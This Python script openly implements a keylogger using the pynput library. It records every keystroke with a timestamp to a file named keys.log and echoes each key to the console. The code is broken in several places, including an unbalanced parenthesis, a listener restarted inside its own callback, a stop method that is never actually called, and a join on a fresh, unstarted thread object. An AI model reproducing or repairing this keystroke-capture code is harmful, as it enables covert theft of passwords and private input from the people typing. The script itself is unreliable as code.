from pynput import keyboard
import logging
import threading
import time

class KeyLogger(threading.Thread):
        def __init__(self):
                super().__init__()
                self.quitKeylogger = False
        def start(self):
                logging.basicConfig(filename="keys.log",level=logging.DEBUG, format='%(asctime)s %(message)s')
                def on_press(key):
                        print(str(self.quitKeylogger))
                        print('Key {} pressed.'.format(key))
                        logging.debug(str(key))
                        print(str(self.quitKeylogger))
                        if self.quitKeylogger == True:
                                print('Exiting...')
                                return False
                        listener.start()
                with keyboard.Listener(on_press = on_press)) as listener:
                        listener.join()
        def stop(self):
                self.quitKeylogger = True
                print("exiting")
                print(str(self.quitKeylogger))

print(threading.enumerate())                
KeyLogger().start()
time.sleep(5)
print("Stopping thread")
keyboard.Listener.stop 
KeyLogger().join()
print(threading.enumerate())